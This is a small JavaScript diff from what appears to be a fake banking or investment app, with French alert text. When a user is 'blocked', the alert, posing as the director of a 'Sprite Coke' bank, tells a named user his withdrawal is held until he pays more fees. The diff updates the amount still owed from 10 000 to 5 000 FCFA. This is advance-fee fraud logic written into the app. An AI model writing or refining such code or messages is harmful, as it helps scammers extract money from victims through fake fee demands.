@@ -508,7 +508,7 @@ async function processWithdrawal() {
     // Vérification si l'utilisateur est bloqué
     const isBlocked = await checkIfUserBlocked(currentUser.uid);
     if (isBlocked) {
-        showBlockedAlert("Bonjour monsieur RIBO, je suis monsieur le directeur de la banque Sprite Coke. Votre solde est au niveau de 223 944 FCFA. Vous avez payé une somme de taxe de 15 000 FCFA. Vous devez retirer toute la somme qui est sur votre compte. Veuillez payer les 10 000 FCFA et lancer le retrait. Merci.");
+        showBlockedAlert("Bonjour monsieur RIBO, je suis monsieur le directeur de la banque Sprite Coke. Votre solde est au niveau de 223 944 FCFA. Vous avez payé une somme de taxe de 15 000 FCFA. Vous devez retirer toute la somme qui est sur votre compte. Montant reste à payer 5000 FCFA payer les 5 000 FCFA et lancer le retrait. Montant déjà payé 10 000 FCFA Merci.");
         return;
     }
     
